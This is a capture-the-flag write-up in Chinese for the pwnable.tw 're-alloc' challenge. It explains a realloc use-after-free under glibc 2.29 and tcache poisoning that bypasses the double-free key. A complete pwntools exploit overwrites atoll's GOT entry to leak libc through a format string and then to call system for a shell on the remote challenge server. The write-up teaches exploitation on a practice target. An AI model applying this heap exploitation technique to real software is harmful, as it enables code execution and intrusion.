## re-alloc

### 题目分析

题目是libc2.29的菜单题，整道题申请和释放堆块使用的都是realloc函数。主要考察的也是在各种情况下realloc函数的执行情况。另外题目也考察了对于2.29的tcache的利用。主要是覆盖bk指针来绕过对于double free的检查。

### 漏洞分析

题目的漏洞点在于reallocate函数中，如果输入的size为0就会将chunk free掉，但是函数并没有清空指针造成了UAF。

```c
printf("Index:");
v1 = read_long();
if ( v1 > 1 || !heap[v1] )
return puts("Invalid !");
printf("Size:");
size = read_long();
if ( size > 0x78 )
return puts("Too large!");

v3 = realloc((void *)heap[v1], size);// size = 0，UAF 
if ( !v3 )
return puts("alloc error");
heap[v1] = v3;
printf("Data:");
return read_input(heap[v1], size);
```

### 漏洞利用

因为整个题目没有show函数，所以要先考虑泄露。因为chunk是否在bins中是不会影响realloc函数进行size的比较的所以，当通过UAF拿到一块在bins中的chunk时，再对这块chunk进行realloc返回的仍然是这块chunk的地址，所以通过reallocte这个函数对bins中的chunk的next指针进行修改。

```c
 v3 = realloc((void *)heap[v1], size);// newsize = chunk_size时仍然返回原指针
 if ( !v3 )
   return puts("alloc error");
 heap[v1] = v3;
 printf("Data:");
 return read_input(heap[v1], size);//输入相同的size可以对chunk进行edit
```

这样操作之后，再把原chunk申请出来，tcache中的下一块chunk就是目标地址的chunk。

在不同大小的tcache bin中进行以上操作，就可以的到两个指向目标地址的tcahce chunk。

目标地址设置为atoll函数的got。这样的话利用这两个chunk就可以修改两次atoll的got。第一次修改为printf的plt，可以利用格式化字符漏洞泄露libc。

第二次就可以直接将atoll的got修改为system的地址，然后拿到shell。

### EXP：



```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./re-alloc"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10106)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x00040170C
    '''
    '''
    b *0x0040129A
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice: ",str(idx))

def add(idx,size,payload):
    menu(1)
    a.sendlineafter("Index:",str(idx))
    a.sendlineafter("Size:",str(size))
    a.sendlineafter("Data:",payload)
    return 

def delete(idx):
    menu(3)
    a.sendlineafter("Index:",str(idx))
    return 
    
def realloc(idx,size,content):
    menu(2)
    a.sendlineafter("Index:",str(idx))
    a.sendlineafter("Size:",str(size))
    if size:
        a.sendlineafter("Data:",content)
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33


add(0,0x58,"aaa")
realloc(0,0,"aaa")
realloc(0,0x58,p64(elf.got["atoll"]))#cover the next 
add(1,0x58,"aaa")
realloc(1,0x20,"bbb")
delete(0)
realloc(1,0x20,'a' * 0x10)
delete(1)#这里不会触发double free的检查因为前面的realloc已经把bk位置的key覆盖掉了。

add(0,0x10,"aaa")
realloc(0,0,"aaa")
realloc(0,0x10,p64(elf.got["atoll"]))#cover the next 
add(1,0x10,"aaa")
realloc(1,0x40,"bbb")
delete(0)
#debug()
realloc(1,0x40,'a' * 0x10)
delete(1)#获得两个指向atoll_got的tcache bin，要在两个大小不同的bin中进行

add(0,0x58,p64(elf.plt["printf"]))
menu(1)
a.sendlineafter("Index:","%6$p")
a.recvuntil("0x")
libc_base = int(a.recv(12),16) - libc.sym["_IO_2_1_stdout_"]
fuck(libc_base)#leak libc_base

menu(1)
a.sendafter("Index:","a")
a.sendafter("Size:",'a'*0x10)
a.sendlineafter("Data:",p64(libc_base + libc.sym["system"]))

menu(1)
a.sendafter("Index:","/bin/sh")
a.interactive()
```

